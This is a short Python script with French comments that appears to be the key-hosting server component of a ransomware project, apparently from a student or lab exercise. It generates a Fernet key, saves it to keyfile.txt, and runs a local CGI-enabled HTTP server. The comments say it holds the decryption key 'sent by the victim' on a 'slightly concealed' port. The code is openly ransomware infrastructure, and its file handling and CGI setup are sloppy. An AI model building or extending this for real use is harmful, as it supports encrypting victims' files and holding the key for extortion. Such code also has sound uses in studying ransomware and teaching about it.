import http.server
import requests
import threading
from cryptography.fernet import Fernet


"""
    Programme pour lancer le serveur hébergeant en local la clé secrète.
"""

def generate_key():
    """
    Génère la clé AES 128 pour chiffrer puis déchiffrer le fichier
    """

    key = Fernet.generate_key()
    #cryptor = Fernet(key)
    f_enc = open("keyfile.txt", 'wb')
    f_enc.write(key)
    



"""
Le serveur hébergera la clé de déchiffrement envoyé par la victime.
"""
generate_key()
port = 8080 # port classique http légèrement dissimulé
server_address = ("127.0.0.1", port) #Création d'un serveur web en localhost soit 127.0.0.1
server = http.server.HTTPServer
handler = http.server.CGIHTTPRequestHandler
handler.cgi_directories = ["./"]
print("Serveur actif sur le port :", port)
httpd = server(server_address, handler)
httpd.serve_forever()

